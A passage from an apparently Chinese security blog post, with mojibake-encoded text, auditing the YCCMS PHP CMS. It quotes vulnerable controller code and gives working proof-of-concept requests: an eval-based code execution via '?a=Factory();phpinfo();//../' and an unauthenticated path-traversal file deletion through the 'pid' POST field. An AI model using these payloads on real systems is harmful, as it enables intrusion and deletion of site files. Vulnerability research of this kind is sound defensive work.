class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>&#125;<br>    <span class="hljs-comment">//è¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œç”¨æˆ·æƒé™çš„åˆ¤æ–­ï¼Œéç®¡ç†å‘˜ï¼ˆæœªç™»å½•ï¼‰ç”¨æˆ·ä¹Ÿå¯è®¿é—®åˆ°å›¾ç‰‡åˆ—è¡¨å¹¶åˆ é™¤</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>);<span class="hljs-comment">//æ‰“å¼€ /uploads/ ç›®å½•</span><br><span class="hljs-variable">$_dirName</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//ä¿å­˜å›¾ç‰‡å</span><br><span class="hljs-variable">$_picArr</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">while</span>(!!<span class="hljs-variable">$_dirName</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$_dirPath</span>))&#123;<span class="hljs-comment">//éå† uploads ä¸‹çš„æ–‡ä»¶ï¼Œæ­¤å¤„æ— è¿‡æ»¤</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br><span class="hljs-variable">$_picArr</span>[] = <span class="hljs-variable">$_dirName</span>;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">krsort</span>(<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//é€†åºæ’åˆ—</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picNum&#x27;</span>,<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>))-<span class="hljs-number">2</span>);<span class="hljs-comment">//è·å–ä¸Šä¼ çš„æ–‡ä»¶æ•°</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picArr&#x27;</span>,<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//æ˜¾ç¤ºä¸Šä¼ æ–‡ä»¶</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/picshow.tpl&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//åˆ é™¤å›¾ç‰‡ï¼Œä¾æ—§æ²¡æœ‰éªŒè¯ç”¨æˆ·</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;æ²¡æœ‰é€‰æ‹©ä»»ä½•å›¾ç‰‡!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//æ˜¯å¦é€‰æ‹©å›¾ç‰‡ï¼Œè‹¥ä¸ºç©ºï¼Œlayer_alert å¼¹çª—æç¤º7å¹¶è·³å› &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//ä¸Šä¼ ç›®å½•çš„è·Ÿè·¯å¾„</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//éå†æäº¤çš„å›¾ç‰‡å</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//æ„é€ æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œçš„è·¯å¾„å¯ä»¥æ‹¼æ¥ï¼Œä¸” $_value æ˜¯å¯æ§çš„ï¼Œé€ æˆæ¼æ´</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() åˆ é™¤æ–‡ä»¶</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å›¾ç‰‡åˆ é™¤å¤±è´¥,è¯·è®¾æƒé™ä¸º777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="SearchAction-class-php"><a href="#SearchAction-class-php" class="headerlink" title="SearchAction.class.php"></a>SearchAction.class.php</h4><p>æœç´¢æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼šç”¨äºå‰ç«¯é¡µé¢çš„å†…å®¹æœç´¢</p><h4 id="SystemAction-class-php"><a href="#SystemAction-class-php" class="headerlink" title="SystemAction.class.php"></a>SystemAction.class.php</h4><p>ç³»ç»Ÿè®¾ç½®æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼šåå°ç³»ç»Ÿä¿¡æ¯ã€è®¾ç½®é¦–é¡µæ–‡å­—å†…å®¹</p><h2 id="è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°"><a href="#è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°" class="headerlink" title="è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°"></a>è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°</h2><p><a href="https://www.cnblogs.com/phpper/p/8976304.html">PHP ä¸­ privateã€publicã€protectedåŒºåˆ«</a></p><p><a href="https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">PHP ä¹‹ Smarty æ¨¡æ¿å¼•æ“ä½¿ç”¨æ±‡æ€»</a></p><p>Smarty æ˜¯ PHP çš„ä¸€ä¸ªå¼•æ“æ¨¡æ¿ï¼Œå¯ä»¥å°† MVC ä¸­çš„ C åˆ†ç¦»å‡ºæ¥ã€‚</p><p><a href="https://blog.csdn.net/weixin_50602266/article/details/121910781">JavaScriptä¹‹Ajax</a></p><blockquote><p>AJAX (Asynchronous JavaScript and XML) å¼‚æ­¥ JS å’Œ XMLï¼Œåœ¨ä¸åˆ·æ–°æ•´ä¸ªé¡µé¢çš„æƒ…å†µä¸‹ï¼Œä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®çš„æŠ€æœ¯ã€‚</p></blockquote><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><blockquote><p><code>htmlspecialchars()</code> å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><p>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š</p><ul><li>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</li><li>â€œ ï¼ˆåŒå¼•å·ï¼‰æˆä¸º â€œ</li><li>â€˜ ï¼ˆå•å¼•å·ï¼‰æˆä¸º â€˜</li><li>&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</li><li>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</li></ul></blockquote><h2 id="å†å²æ¼æ´"><a href="#å†å²æ¼æ´" class="headerlink" title="å†å²æ¼æ´"></a>å†å²æ¼æ´</h2><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137">YCCMSå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCNVD-2021-47137ï¼‰</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794">YCCMSå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCNVD-2021-46794ï¼‰</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795">YCCMSå­˜åœ¨é€»è¾‘ç¼ºé™·æ¼æ´</a></p><h3 id="RCEæ¼æ´å¤ç°"><a href="#RCEæ¼æ´å¤ç°" class="headerlink" title="RCEæ¼æ´å¤ç°"></a>RCEæ¼æ´å¤ç°</h3><p>æ ¹æ®Action.class.phpå®¡è®¡ï¼Œå‘ç°<code>method_exists($this, $_m) ? eval(&#39;$this-&gt;&#39;.$_m.&#39;();&#39;) : $this-&gt;index();</code></p><p>eval() å¯ä»¥æ‰§è¡Œä»»æ„å­—ç¬¦ä¸²å½¢å¼çš„ PHP ä»£ç ï¼Œæ­¤å¤„é€šè¿‡æœç´¢å‘ç° run()å‡½æ•° å‡ºç°åœ¨ config&#x2F;run.inc.php è¿™ä¸ªæ–‡ä»¶ï¼Œå­˜åœ¨rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//config/run.inc.php  </span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><br>-&gt;<span class="hljs-title function_ invoke__">setAction</span>()<br><br><span class="hljs-comment">//public/class/Factory.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Factory</span></span>&#123;<br>    ...<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<span class="hljs-comment">//$_a æ˜¯getä¼ å‚ï¼Œå¯æ§å˜é‡</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;  <br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<span class="hljs-comment">//ucfirst(), å°†å­—ç¬¦ä¸²é¦–å­—æ¯è½¬åŒ–ä¸ºå¤§å†™ï¼Œfile_exists() å‡½æ•°æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨å°±å›é€€ä¸º Login æ§åˆ¶å™¨</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1ã€ç»•è¿‡ file_existsï¼ˆï¼‰</p><p>è¿™ä¸ªå‡½æ•°åœ¨è¿›è¡Œæ£€æŸ¥æ—¶ï¼Œæ¯”å¦‚&#x2F;controller&#x2F;admin;&#x2F;..&#x2F;ï¼Œå‡½æ•°å…è®¸è·¯å¾„ä¸­æœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ä¸”é‡åˆ°&#x2F;..&#x2F;ä¼šè¿”å›åˆ°ä¸Šçº§ç›®å½•ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç»•è¿‡ file_existsï¼ˆï¼‰å‡½æ•°æ£€æŸ¥ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æ„é€ poc:<code>Factory();phpinfo();//../</code></p><p>2ã€å…¥å£ç‚¹</p><p>è°ƒç”¨Factory() çš„å…¥å£ç‚¹åœ¨ Factory::setAction()-&gt;run(); è¿™é‡Œï¼Œåœ¨admin&#x2F;index.php è¿™ä¸ªæ–‡ä»¶ä¸­å¾—çŸ¥ï¼Œå®ƒåŒ…å«äº†&#x2F;config&#x2F;run.inc.phpï¼Œå¯ä»¥åˆ©ç”¨</p><p>3ã€POC</p><p><code>/admin?a=Factory();phpinfo();//../</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png" alt="20250710234248614"></p><h3 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p>æ ¹æ®å®¡è®¡PicAction.class.phpæ—¶é‡åˆ°çš„delall()å‡½æ•°ï¼Œæ— éªŒè¯é€ æˆçš„ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œè¿›è¡Œå¤ç°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//åˆ é™¤å›¾ç‰‡ï¼Œä¾æ—§æ²¡æœ‰éªŒè¯ç”¨æˆ·</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;æ²¡æœ‰é€‰æ‹©ä»»ä½•å›¾ç‰‡!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//æ˜¯å¦é€‰æ‹©å›¾ç‰‡ï¼Œè‹¥ä¸ºç©ºï¼Œlayer_alert å¼¹çª—æç¤º7å¹¶è·³å› &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//ä¸Šä¼ ç›®å½•çš„è·Ÿè·¯å¾„</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//éå†æäº¤çš„å›¾ç‰‡å</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//æ„é€ æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œçš„è·¯å¾„å¯ä»¥æ‹¼æ¥ï¼Œä¸” $_value æ˜¯å¯æ§çš„ï¼Œé€ æˆæ¼æ´</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() åˆ é™¤æ–‡ä»¶</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;å›¾ç‰‡åˆ é™¤å¤±è´¥,è¯·è®¾æƒé™ä¸º777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥åˆ°å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png" alt="20250712193547260"></p><p>å…ˆç»™ upload éšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png" alt="20250712193717272"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png" alt="20250712193754284"></p><p>åˆ é™¤ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png" alt="20250712193827895"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png" alt="20250712193843074"></p><p>URLç¼–ç ï¼š<code>pid%5B0%5D=1.png&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>è§£ç ï¼š</p><p><code>pid[0]=1.png&amp;chkall=on&amp;send=åˆ é™¤é€‰ä¸­å›¾ç‰‡</code></p><p><code>chkall=on</code>æ˜¯ä¸€ä¸ªå¤é€‰æ¡†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png" alt="20250712194432977"></p><p>å¯ä»¥çœ‹åˆ°åªè¦åœ¨pidåçš„æ–‡ä»¶åè¿›è¡Œè·¯å¾„æ‹¼æ¥å°±å¯ä»¥è·³åˆ°ä»»æ„ç›®å½•å»åˆ é™¤æ–‡ä»¶</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥æ ¹æ®ä¸Šé¢çš„æ•°æ®æ„é€ POCï¼š</p><p><code>pid[0]=/../1.txt&amp;chkall=on&amp;send=åˆ é™¤é€‰ä¸­å›¾ç‰‡</code></p><p><code>pid%5B0%5D=/../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>è·¯ç”±ï¼šadmin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall</p><p>åœ¨æ ¹ç›®å½•å‡†å¤‡ä¸€ä¸ª1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png" alt="20250712194601104"></p><p>é€€å‡ºç™»å½•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png" alt="20250712194749344"></p><p>POSTä¼ å‚ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png" alt="20250712195154540"></p><p>ä¸Šå›¾çš„æµè§ˆå™¨åˆ ä¸æ‰ï¼Œæ¢äº†ä¸€ä¸ªæˆåŠŸäº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png" alt="20250712195540507"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png" alt="20250712195612613"></p><h3 id="ä»»æ„æ–‡ç« -æ–‡ä»¶ï¼ˆnoï¼‰åˆ é™¤"><a href="#ä»»æ„æ–‡ç« -æ–‡ä»¶ï¼ˆnoï¼‰åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ç« &#x2F;æ–‡ä»¶ï¼ˆnoï¼‰åˆ é™¤"></a>ä»»æ„æ–‡ç« &#x2F;æ–‡ä»¶ï¼ˆnoï¼‰åˆ é™¤</h3><p>è¿™é‡Œæƒ³åˆ°å®¡è®¡ArticleAction.class.phpæ—¶ä¹Ÿæœ‰delall()å‡½æ•°ï¼Œçœ‹çœ‹è¿™é‡Œæœ‰æ²¡æœ‰æ–‡ç« åˆ é™¤æ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//åˆ é™¤å•ä¸ªæ–‡ç« </span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//å…ˆåˆ é™¤é™æ€æ–‡ä»¶</span><br><span class="hljs-keyword">if</span>(tool::<span class="hljs-title function_ invoke__">delete_file</span>(<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>())&#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;åˆ é™¤å¤±è´¥!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//åˆ é™¤å¤šä¸ªæ–‡ç« </span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;æ²¡æœ‰é€‰æ‹©ä»»ä½•å†…å®¹!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//å…ˆåˆ é™¤é™æ€æ–‡ä»¶</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;é™æ€æ–‡ä»¶åˆ é™¤å¤±è´¥,è¯·è®¾æƒé™ä¸º777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h4><p>GETä¼ å‚ï¼Œ</p><p>æ‰¾åˆ°ä¸€ç¯‡æ–‡ç« çš„id</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png" alt="20250712200511140"></p><p>æ„é€ POCï¼š<code>admin/?a=article&amp;m=delete&amp;id=2450</code></p><p><img 